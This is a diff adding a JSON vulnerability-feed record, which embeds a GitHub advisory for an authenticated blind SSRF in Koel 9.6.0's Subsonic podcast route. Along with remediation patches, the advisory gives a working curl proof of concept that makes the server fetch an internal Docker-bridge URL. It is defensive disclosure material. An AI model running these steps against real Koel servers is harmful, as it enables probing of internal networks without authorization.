@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/62960949?v=4\", \"events_url\": \"https://api.github.com/users/dennyabrahamsinaga/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/dennyabrahamsinaga/followers\", \"following_url\": \"https://api.github.com/users/dennyabrahamsinaga/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/dennyabrahamsinaga/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/dennyabrahamsinaga\", \"id\": 62960949, \"login\": \"dennyabrahamsinaga\", \"node_id\": \"MDQ6VXNlcjYyOTYwOTQ5\", \"organizations_url\": \"https://api.github.com/users/dennyabrahamsinaga/orgs\", \"received_events_url\": \"https://api.github.com/users/dennyabrahamsinaga/received_events\", \"repos_url\": \"https://api.github.com/users/dennyabrahamsinaga/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/dennyabrahamsinaga/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/dennyabrahamsinaga/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/dennyabrahamsinaga\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54492\", \"cvss\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"### Summary\\nKoel `v9.6.0` protects the regular podcast subscription API with `SafeUrl`, but the Subsonic-compatible `createPodcastChannel.view` route does not apply the same protection. An authenticated user can supply a private URL and cause Koel to fetch it server-side during podcast parsing.\\n\\nThis was validated against `v9.6.0` (`352ea5ec27fa22294da8fb6beacb3d5552f0d09c`) using the official `phanan/koel:9.6.0` image.\\n\\nThis is distinct from `GHSA-7j2f-6h2r-6cqc`, which fixed unsafe episode enclosure URLs in versions `<= 9.3.4`. The issue here is a newer validation gap in the Subsonic route itself, still present in `v9.6.0`.\\n\\n### Details\\n#### SafeUrl protects the regular podcast API only\\n\\nThe regular podcast subscription path validates the feed URL with `SafeUrl`:\\n\\n- `app/Http/Requests/API/Podcast/PodcastStoreRequest.php`\\n\\n```php\\nreturn [\\n    'url' => ['required', 'url', new SafeUrl()],\\n];\\n```\\n\\nThe Subsonic-compatible route does not:\\n\\n- `routes/subsonic.php`\\n  - `createPodcastChannel.view`\\n- `app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php`\\n\\n```php\\nreturn [\\n    'url' => ['required', 'string', 'url'],\\n];\\n```\\n\\nThat creates the same kind of trust-boundary mismatch as the radio issue: the main API rejects private targets, while the compatibility route accepts them.\\n\\n#### The URL is fetched immediately by the podcast parser\\n\\nThe attacker-controlled URL is used by the podcast service during channel creation:\\n\\n- `app/Http/Controllers/Subsonic/CreatePodcastChannelController.php`\\n- `app/Services/Podcast/PodcastService.php`\\n\\n`PodcastService::addPodcast()` calls:\\n\\n```php\\n$parser = $this->createParser($url);\\n```\\n\\nand `createParser()` resolves to:\\n\\n```php\\nreturn Poddle::fromUrl($url, 5 * 60, $this->client);\\n```\\n\\nThis means the SSRF happens as part of the channel creation flow itself. No separate playback step is needed.\\n\\n#### This bypasses Koel's intended SSRF control for podcast URLs\\n\\nKoel already added `SafeUrl` to the regular podcast API and has already published a podcast-related SSRF advisory. The Subsonic route does not reuse that same control, so it reintroduces a server-side fetch primitive for private destinations.\\n\\n### PoC\\nThe following steps were validated against the official `phanan/koel:9.6.0` image.\\n\\n1. Authenticate and obtain an API token:\\n\\n```bash\\nAPI_TOKEN=$(\\n  curl -sS -X POST http://127.0.0.1:18081/api/me \\\\\\n    -H 'Content-Type: application/json' \\\\\\n    --data '{\\\"email\\\":\\\"admin@koel.dev\\\",\\\"password\\\":\\\"KoelIsCool\\\"}' \\\\\\n  | python3 -c 'import json,sys; print(json.load(sys.stdin)[\\\"token\\\"])'\\n)\\n```\\n\\n2. Obtain the user's Subsonic API key:\\n\\n```bash\\nSUBSONIC_KEY=$(\\n  curl -sS http://127.0.0.1:18081/api/data \\\\\\n    -H \\\"Authorization: Bearer $API_TOKEN\\\" \\\\\\n  | python3 -c 'import json,sys; print(json.load(sys.stdin)[\\\"current_user\\\"][\\\"subsonic_api_key\\\"])'\\n)\\n```\\n\\n3. Prepare an internal-only target URL. In my validation, I used a host-side RSS fixture reachable from the container through the Docker bridge:\\n\\n```bash\\nTARGET_URL=\\\"http://172.17.0.1:18090/feed.xml?run=1\\\"\\n```\\n\\n4. Confirm the regular web API blocks the URL:\\n\\n```bash\\ncurl -i -X POST http://127.0.0.1:18081/api/podcasts \\\\\\n  -H \\\"Authorization: Bearer $API_TOKEN\\\" \\\\\\n  -H 'Accept: application/json' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  --data \\\"{\\\\\\\"url\\\\\\\":\\\\\\\"$TARGET_URL\\\\\\\"}\\\"\\n```\\n\\nExpected result:\\n\\n- HTTP `422`\\n- Error includes `The url must point to a public URL.`\\n\\n5. Trigger the Subsonic route with the same URL:\\n\\n```bash\\ncurl -i -G http://127.0.0.1:18081/rest/createPodcastChannel.view \\\\\\n  --data-urlencode \\\"apiKey=$SUBSONIC_KEY\\\" \\\\\\n  --data-urlencode 'f=json' \\\\\\n  --data-urlencode \\\"url=$TARGET_URL\\\"\\n```\\n\\nExpected result:\\n\\n- HTTP `200`\\n- JSON includes `\\\"status\\\":\\\"ok\\\"`\\n\\n6. Confirm the server-side request happened by checking the internal HTTP service logs.\\n\\nDuring validation, the local HTTP test server received `HEAD` and `GET ` requests for `/feed.xml?run=1`.\\n\\n### Impact\\nAn authenticated user can make Koel send server-side HTTP requests to internal destinations that are intentionally blocked by the main web API.\\n\\nValidated impact:\\n- SSRF to loopback, Docker-bridge, and RFC1918 HTTP destinations reachable from the Koel server\\n- Internal service discovery and request execution through the podcast parser\\n\\nGeneric response-body exfiltration was not validated through this exact route. The confirmed impact is SSRF-based internal request execution.\\n\\n### Remediation\\n\\nThe Subsonic podcast request validator should apply `SafeUrl`, and the parser entry point should reject unsafe targets as defense in depth.\\n\\nSuggested patch for `app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php`:\\n\\n```diff\\ndiff --git a/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php b/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php\\n--- a/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php\\n+++ b/app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php\\n@@\\n namespace App\\\\Http\\\\Requests\\\\Subsonic;\\n \\n use App\\\\Http\\\\Requests\\\\Request;\\n+use App\\\\Rules\\\\SafeUrl;\\n@@\\n     public function rules(): array\\n     {\\n         return [\\n-            'url' => ['required', 'string', 'url'],\\n+            'url' => ['required', 'string', 'url', new SafeUrl()],\\n         ];\\n     }\\n }\\n```\\n\\nSuggested defense-in-depth patch for `app/Services/Podcast/PodcastService.php`:\\n\\n```diff\\ndiff --git a/app/Services/Podcast/PodcastService.php b/app/Services/Podcast/PodcastService.php\\n--- a/app/Services/Podcast/PodcastService.php\\n+++ b/app/Services/Podcast/PodcastService.php\\n@@\\n     private function createParser(string $url): Poddle\\n     {\\n+        if (!$this->network->isSafeUrl($url)) {\\n+            throw FailedToParsePodcastFeedException::create($url);\\n+        }\\n+\\n         return Poddle::fromUrl($url, 5 * 60, $this->client);\\n     }\\n }\\n```\", \"ghsa_id\": \"GHSA-w79m-f3jx-779v\", \"github_reviewed_at\": \"2026-07-15T17:07:16Z\", \"html_url\": \"https://github.com/advisories/GHSA-w79m-f3jx-779v\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w79m-f3jx-779v\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54492\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-15T17:07:16Z\", \"references\": [\"https://github.com/koel/koel/security/advisories/GHSA-w79m-f3jx-779v\", \"https://github.com/koel/koel/pull/2545\", \"https://github.com/koel/koel/commit/1331f335342b405e60ffabdd60f1f398508f996f\", \"https://github.com/koel/koel/releases/tag/v9.7.0\", \"https://github.com/advisories/GHSA-w79m-f3jx-779v\"], \"repository_advisory_url\": \"https://api.github.com/repos/koel/koel/security-advisories/GHSA-w79m-f3jx-779v\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/koel/koel\", \"summary\": \"Koel: Authenticated Blind SSRF via Subsonic Podcast Channel Creation\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-15T17:07:17Z\", \"url\": \"https://api.github.com/advisories/GHSA-w79m-f3jx-779v\", \"vulnerabilities\": [{\"first_patched_version\": \"9.7.0\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phanan/koel\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 9.6.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w79m-f3jx-779v",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "phanan/koel: <= 9.6.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-54492"
+    ],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "phanan/koel"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:54.997826Z",
+  "provenance": {
+    "content_sha256": "49151cf1230ab11e20ac9aede7eda24c5fdd2affb0d6487e0512b5a638f9ed4e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-15T17:07:16Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w79m-f3jx-779v",
+  "status": "active",
+  "title": "Koel: Authenticated Blind SSRF via Subsonic Podcast Channel Creation",
+  "updated_at": "2026-07-15T17:07:17Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w79m-f3jx-779v"
+}
